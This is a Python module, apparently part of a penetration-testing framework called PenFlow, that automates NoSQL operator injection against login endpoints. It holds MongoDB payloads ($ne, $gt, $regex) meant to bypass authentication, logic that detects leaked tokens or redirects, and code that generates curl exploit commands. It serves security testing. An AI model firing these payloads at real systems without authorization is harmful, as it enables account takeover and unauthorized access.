"""
Pure NoSQL Injection Capability Agent for PenFlow.

Capabilities:
  - MongoDB Operator Injection ($gt, $ne, $regex, $where)
  - CouchDB / Redis NoSQL Operator Injection
  - Authentication Bypass via NoSQL JSON / Query Operators
  - Baseline comparison to ensure Zero False Positives
"""
import json
from typing import Dict, Any, List, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.nosql_injection")

NOSQL_PAYLOADS = [
    {"username": "admin", "password": {"$ne": "penflow_nonexistent_password_999"}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": "admin", "password": {"$regex": "^admin"}},
]

NOSQL_ERROR_KEYWORDS = [
    "mongodb", "mongoerror", "couchdb", "bson", "cast to objectid failed",
    "cannot use $ne", "unknown operator $ne", "unhandledrejection",
    "cant use $gt", "expression failed"
]


class NoSQLInjectionAgent(BaseCapabilityAgent):
    """
    Capability Agent probing MongoDB, CouchDB, and Redis NoSQL query operator injections.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="NoSQLInjectionAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="nosql_injection",
                name="Pure NoSQL Injection",
                description="Detects MongoDB/CouchDB operator injections ($ne, $gt, $regex) leading to auth bypass",
                priority=self.priority,
                tags=["nosql", "mongodb", "injection"]
            )
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")

        http_client = context.get_http_client()
        target_urls = self._collect_endpoints(context)

        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []
        best_target = target_urls[0] if target_urls else f"https://{context.asset}/api/v1/auth/login"

        for endpoint in target_urls[:6]:
            # Phase 0: Baseline invalid credentials
            try:
                exch_base = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="POST",
                    url=endpoint,
                    json_data={"username": "penflow_invalid_user_999", "password": "wrong_password_999"}
                )
                resp_base = exch_base.response
                base_text = (resp_base.body_text or "").lower() if resp_base else ""
                base_status = resp_base.status_code if resp_base else 0
            except Exception:
                base_text = ""
                base_status = 0

            for payload in NOSQL_PAYLOADS:
                try:
                    exch = await http_client.send_as_identity(
                        identity_id="anonymous_guest",
                        method="POST",
                        url=endpoint,
                        json_data=payload
                    )
                    resp = exch.response
                    if not resp:
                        continue

                    body_lower = (resp.body_text or resp.body_snippet or "").lower()
                    exch_dict = exch.to_dict()

                    # Phase 1: Check for exposed MongoDB / BSON database errors
                    is_mongo_error = any((kw in body_lower) and (kw not in base_text) for kw in NOSQL_ERROR_KEYWORDS)

                    # Phase 2: Check for genuine auth bypass (JSON token or 302 redirect to authenticated session)
                    is_auth_bypassed = False
                    if resp.status_code in (200, 201) and base_status in (400, 401, 403, 404, 422):
                        # Verify it's not just returning the same login page with an error
                        if "invalid" not in body_lower and "incorrect" not in body_lower and "failed" not in body_lower:
                            if any(k in body_lower for k in ["access_token", "jwt", "session_id", "authtoken", "bearer"]):
                                is_auth_bypassed = True
                    elif resp.status_code == 302 and base_status in (401, 403, 200):
                        loc = resp.headers.get("location", "").lower()
                        if any(p in loc for p in ["/dashboard", "/my-account", "/admin", "/profile", "/home"]):
                            is_auth_bypassed = True

                    if is_auth_bypassed or is_mongo_error:
                        curl_cmd = f"curl -i -s -k -X POST '{endpoint}' -H 'Content-Type: application/json' -d '{json.dumps(payload)}'"
                        severity = "CRITICAL" if is_auth_bypassed else "HIGH"
                        reasoning = (
                            f"CRITICAL NoSQL Authentication Bypass: Endpoint '{endpoint}' accepted query operator payload {json.dumps(payload)} granting authenticated session."
                            if is_auth_bypassed else
                            f"HIGH NoSQL Operator Injection: Endpoint '{endpoint}' disclosed unhandled MongoDB/BSON error."
                        )

                        findings.append({
                            "vulnerability_type": "nosql_injection",
                            "target_url": endpoint,
                            "payload": json.dumps(payload),
                            "severity": severity,
                            "confidence": 0.98 if is_auth_bypassed else 0.90,
                            "is_vulnerable": True,
                            "exploit_curl": curl_cmd,
                            "reproduction_steps": self.poc_generator.generate_reproduction_steps("NoSQL Operator Injection", endpoint, curl_cmd),
                            "description": reasoning,
                            "_exchange_obj": exch_dict,
                            "evidence_exchanges": [exch_base.to_dict(), exch_dict]
                        })
                        evidence["nosql_auth_bypass"] = True
                        break
                except Exception as e:
                    logger.debug(f"NoSQL test failed on {endpoint}: {e}")

            if findings:
                break

        is_vuln = len(findings) > 0
        from penflow.capabilities.result import AgentExecutionResult
        return AgentExecutionResult(
            agent=self.name,
            capability=capability_id,
            asset=context.asset,
            status="COMPLETED",
            is_vulnerable=is_vuln,
            confidence_score=0.98 if is_vuln else 0.0,
            reasoning=findings[0]["description"] if findings else "NoSQL operator injection inputs safely validated and rejected.",
            target_url=best_target,
            findings=findings,
            evidence={
                "nosql_auth_bypass": evidence.get("nosql_auth_bypass", False),
                "findings": findings,
                "evidence_exchanges": findings[0].get("evidence_exchanges", []) if findings else []
            }
        ).to_dict()

    def _collect_endpoints(self, context: CapabilityExecutionContext) -> List[str]:
        target = context.asset if hasattr(context, "asset") else "example.com"
        target_url = target if target.startswith("http") else f"https://{target}"
        endpoints = []

        for data in context.get_observation_data():
            if isinstance(data, dict):
                if "endpoints" in data and isinstance(data["endpoints"], list):
                    for ep in data["endpoints"]:
                        if isinstance(ep, dict) and ep.get("url"):
                            u = ep["url"]
                            if any(p in u.lower() for p in ["/login", "/auth", "/signin", "/user", "/api"]):
                                endpoints.append(u)
                elif "url" in data and data["url"]:
                    u = data["url"]
                    if any(p in u.lower() for p in ["/login", "/auth", "/signin", "/user", "/api"]):
                        endpoints.append(u)

        if not endpoints:
            endpoints = [f"{target_url}/api/v1/auth/login", f"{target_url}/login"]

        return list(dict.fromkeys(endpoints))
